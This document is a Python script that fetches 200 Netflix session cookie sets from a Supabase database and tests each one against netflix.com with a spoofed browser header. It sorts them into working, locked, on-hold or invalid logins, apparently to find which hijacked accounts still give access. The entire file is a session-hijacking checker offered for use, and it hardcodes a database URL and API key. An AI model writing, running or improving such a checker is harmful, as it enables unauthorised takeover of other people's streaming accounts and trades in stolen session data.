import requests
import json
import time

SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
}

def analyze_cookie(sess):
    cookies_data = sess.get('cookies')
    description = sess.get('description', 'Unknown')
    if not cookies_data: return "INVALID (No data)"
    if isinstance(cookies_data, str):
        cookies_list = json.loads(cookies_data)
    else:
        cookies_list = cookies_data
    
    s = requests.Session()
    s.headers.update(HEADERS)
    for c in cookies_list:
        s.cookies.set(c['name'], c['value'], domain=c.get('domain', '.netflix.com'))
    
    try:
        # Check /browse
        resp = s.get("https://www.netflix.com/browse", timeout=12, allow_redirects=True)
        final_url = resp.url
        html = resp.text.lower()
        
        # Check Indicators
        is_hold = "update your payment" in html or "account on hold" in html or "/member" in final_url and ("update" in html or "payment" in html)
        is_household = "update your primary location" in html or "household" in html or "geoblock" in html
        is_plan = "choose your plan" in html or "planSelection" in final_url
        is_login = "/login" in final_url
        
        if is_login:
            return f"INVALID (Redirected to Login) [URL: {final_url}]"
        
        if is_hold:
            return "FALSE POSITIVE (VALID but on HOLD/PAYMENT)"
        
        if is_household:
            return "FALSE POSITIVE (VALID but HOUSEHOLD LOCKED)"
            
        if is_plan:
            return "FALSE POSITIVE (VALID but NO PLAN)"
            
        if "/browse" in final_url:
            return "WORKING (Landed on /browse)"
            
        if "/profiles" in final_url:
            return "WORKING (Landed on /profiles)"
            
        if "/YourAccount" in final_url:
            return "WORKING (Landed on /YourAccount)"
            
        return f"UNKNOWN VALID STATE (URL: {final_url})"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def main():
    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    print("Fetching 200 cookies for comprehensive analysis...")
    response = requests.get(f"{SUPABASE_URL}/rest/v1/cookie_sessions?select=*&limit=200", headers=headers)
    sessions = response.json()
    
    stats = {}
    
    for i, sess in enumerate(sessions):
        desc = sess.get('description', 'Unknown')
        print(f"[{i+1}/200] {desc[:40]}...", end=" ", flush=True)
        res = analyze_cookie(sess)
        print(res)
        stats[res] = stats.get(res, 0) + 1
        time.sleep(0.5) # Fast but safe
        
    print("\n" + "="*50)
    print("FINAL FALSE POSITIVE ANALYSIS SUMMARY")
    print("="*50)
    for state, count in sorted(stats.items(), key=lambda x: x[1], reverse=True):
        print(f"{state}: {count}")

if __name__ == "__main__":
    main()
